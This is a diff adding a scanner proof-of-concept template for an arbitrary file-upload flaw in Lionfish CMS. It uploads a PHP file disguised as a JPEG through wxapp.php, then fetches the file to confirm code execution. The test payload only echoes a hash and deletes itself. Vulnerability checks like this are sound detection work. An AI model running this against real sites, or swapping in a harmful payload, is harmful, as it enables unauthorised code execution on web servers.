@@ -1,0 +1,38 @@
+name: poc-yaml-lionfish-cms-wxapp-php-upload
+binding: 19bf7b61-541e-49ef-9d03-0fcf0b62b656
+manual: true
+detail:
+    author: sharecast
+    links:
+        - https://www.cnblogs.com/KHZ521/p/14782653.html
+    vulnerability:
+        id: CT-416538
+        level: critical
+    warning: 该脚本会上传文件产生一个临时的无害文件，同时能够执行自删除逻辑，但是可能删除不成功
+transport: http
+set:
+    r1: randomInt(40000, 44800)
+    rboundary: randomLowercase(8)
+    randname: randomLowercase(6)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /wxapp.php?controller=Goods.doPageUpload
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+            body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"upfile\"; filename=\"{{randname}}.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo md5({{r1}});unlink(__FILE__);?>\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(".php"))
+        output:
+            search: '"image_o\":\"https?:\\\\/\\\\/.*?\\/(?P<path>.*?)\"".bsubmatch(response.body)'
+            path: replaceAll(search["path"], "\\", "")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /{{path}}
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r1))))
+expression: r0() && r1()
